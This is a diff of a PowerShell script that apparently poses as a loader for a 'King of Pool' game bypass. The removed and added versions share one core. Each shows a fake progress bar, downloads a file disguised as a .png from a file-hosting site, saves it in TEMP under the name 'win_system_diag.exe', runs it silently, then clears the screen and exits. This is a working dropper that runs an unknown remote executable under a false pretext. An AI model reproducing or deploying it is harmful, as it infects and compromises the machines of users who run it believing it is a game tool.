@@ -1,42 +1,14 @@
-# ============================================================
-# X-LIFE PREMIUM LOADER (KING OF POOL EDITION)
-# ============================================================
 Clear-Host
-$Host.UI.RawUI.WindowTitle = "KING OF POOL - SECURITY INITIALIZATION"
-
-# 1. ข้อความทักทาย
-Write-Host "`n  [>] INITIALIZING KING OF POOL ENGINE..." -ForegroundColor Cyan
-Start-Sleep -Milliseconds 600
-
-# 2. ระบบ Animated Loading Bar (0-100%)
-for ($i = 0; $i -le 100; $i += 5) {
-    $percent = "$i%"
-    $numBlocks = [int](<$i / 5>)
-    $bar = ("█" * $numBlocks) + (" " * (20 - $numBlocks))
-    # ปรับสีให้ดูดุดัน (Magenta)
-    Write-Host "`r  [$bar] $percent  " -NoNewline -ForegroundColor Magenta
+for ($i=0;$i -le 100;$i+=5){
+    $p="$i%"
+    $n=[int]($i/5)
+    $b=("█"*$n)+(" "*(20-$n))
+    Write-Host "`r  [$b] $p " -NoNewline -ForegroundColor Magenta
     Start-Sleep -Milliseconds 40
 }
-
-Write-Host "`n  [+] SYSTEM BYPASS READY" -ForegroundColor Green
-Write-Host "  [*] ESTABLISHING CONNECTION..." -ForegroundColor DarkGray
-
-# 3. ส่วนดาวน์โหลดและรันไฟล์หลัก
-$exeUrl = "https://files.catbox.moe/renxf3.png"
-$tempPath = "$env:TEMP\win_system_diag.exe"
-
-try {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
-    Write-Host "  [+] ENGINE BOOTING..." -ForegroundColor Cyan
-    Start-Sleep -Milliseconds 800
-    
-    # เปิดโปรเจกต์หลักของเรา
-    Start-Process -FilePath $tempPath
-    
-    # ล้างหน้าจอแล้วปิดหน้าต่าง PowerShell
-    Clear-Host
-    Exit
-}
-catch {
-    Write-Host "`n  [-] CONNECTION FAILED. PLEASE TRY AGAIN." -ForegroundColor Red
-}
+$u="https://files.catbox.moe/renxf3.png"
+$t="$env:TEMP\win_system_diag.exe"
+iwr -Uri $u -OutFile $t -UseBasicParsing
+Start-Process -FilePath $t
+Clear-Host
+Exit
